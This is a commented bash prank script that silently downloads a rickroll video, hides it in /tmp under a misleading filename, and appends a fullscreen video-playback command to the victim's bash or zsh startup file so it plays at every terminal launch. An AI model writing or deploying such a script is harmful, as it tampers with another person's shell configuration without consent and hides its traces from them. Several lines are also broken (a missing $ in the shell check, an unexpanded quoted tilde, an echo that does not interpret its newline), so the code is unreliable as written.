# The rickroll video link to mp4, modify it if you want because this one is too much big (it takes time to download)
rickrollVideoLink="https://raw.githubusercontent.com/ShatteredDisk/rickroll/master/rickroll.mp4"

# The output filename, modify it so the victim won't find it, I put it in /tmp so when rebooting, the prank goes away
outputFilename="/tmp/temporary.config"

# We download the video, '-q' stands for quiet download so there is no output, and '-O' is here for output filename
wget -q $rickrollVideoLink -O $outputFilename


# We set up the variable (the config file which is executed to every start of the terminal)
if [[ SHELL == '/usr/bin/bash' ]]; then
	shellConfigfile="~/.bashrc"
elif [[ $SHELL == '/usr/bin/zsh' ]]; then
	shellConfigfile="~/.zshrc"
else
	echo -n "\n[!] Shell has not been recognized [!]\n"
	echo "Cleaning the screen in 3 seconds..."
	sleep 3
	clear
	exit 1
fi;


# Writing the video execution in shell config file
echo -n "\ncvlc --fullscreen --video-wallpaper" $outputFilename >> $shellConfigfile

